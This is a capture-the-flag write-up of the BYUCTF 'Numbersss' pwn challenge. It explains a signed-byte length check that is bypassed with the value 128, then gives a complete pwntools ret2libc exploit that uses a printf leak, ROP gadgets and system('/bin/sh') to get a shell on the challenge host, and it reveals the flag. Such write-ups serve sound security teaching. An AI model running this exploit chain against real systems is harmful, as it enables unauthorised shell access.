https://ctftime.org/event/2252/

# Numbersss (Pwn)

Sometimes computer numbers can be so harddd

nc numbersss.chal.cyberjousting.com 1351

## Binary Analysis

`vuln` @ `0x004011b9`:
- Leaks the address of `printf`
- Uses `scanf` with `%hhd` to read a value into `length`
- Checks if the value is less than or equal to `0x10`
    - Done in such a way that negative values will be accepted
- Writes to the stack one byte at a time `length` times by reading from `stdin`

## Solution

We simply perform a ret2libc by supplying `128` as the `length`. This is simply the first value larger than 127 that will be accepted by the conditional check on `length`.

### Bypassing ASLR

First we need to know the version of `libc.so` that the remote is using. We'll use this to bypass ASLR, in combination with the earlier `printf` leak.

Copy the version of `libc.so` that the remote uses from the provided Dockerfile:
    - `$ docker cp id:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so`
    - Which has the following SHA-2-256 hash:
        - `c3a14ee6eb14cdb81f6bbd0ab94ca138597db93d5c8e7bafb5609d2f94ee0068`

### Preparing Gadgets

We find the required gadgets using `ROPgadget` as follows:

```
$ ROPgadget --binary ./libc.so | grep ": pop rdi ; ret$"
0x00000000000240e5 : pop rdi ; ret
```

Note that the main image doesn't contain a `pop rdi` gadget so its easiest to grab it from `libc.so` now that we can bypass ASLR.

Don't forget to include an aligning `ret` gadget with such payloads. This helps keep the stack aligned so that instructions, used within libc, that expect the stack to be `16` byte aligned continue to function.

```
$ ROPgadget --binary ./numbersss | grep ": ret$"
0x0000000000401016 : ret
```

### Final Exploit

```
from pwn import *

elf = ELF("./numbersss", checksec=False)
libc = ELF("./libc.so", checksec=False)
context.binary = elf

p = remote("numbersss.chal.cyberjousting.com", 1351)

p.readuntil(b"Free junk: ")

leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["printf"]

p.readline()

p.sendline(b"128")

POP_RDI = 0x240e5
RET = 0x401016

payload = b"A" * 0x18
payload += p64(libc.address + POP_RDI)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(RET)
payload += p64(libc.sym["system"])
payload = payload.ljust(128, b"B")

p.send(payload)

p.interactive()
```

## Flag
`byuctf{gotta_pay_attention_to_the_details!}`
